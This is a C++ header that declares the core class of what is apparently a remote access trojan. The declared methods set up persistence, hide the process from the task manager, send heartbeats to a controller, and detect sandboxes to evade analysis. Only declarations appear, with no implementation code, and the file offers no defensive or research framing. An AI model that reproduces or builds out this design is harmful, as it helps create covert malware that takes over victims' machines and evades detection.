#ifndef RAT_ENGINE_H
#define RAT_ENGINE_H

#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include "config.h"

class RATEngine {
public:
    RATEngine();
    ~RATEngine();

    bool start();
    void stop();
    bool is_running() const { return running.load(); }
    std::string get_client_id() const { return client_id; }

private:
    std::atomic<bool> running;
    std::string client_id;
    std::vector<std::thread> worker_threads;

    void initialize_mutex();
    void setup_persistence();
    void hide_from_task_manager();
    void heartbeat();

    // Sandbox detection
    bool CheckSandbox();
    bool FileExists(const std::string& path);
    bool IsProcessRunning(const std::string& processName);
};

#endif // RAT_ENGINE_H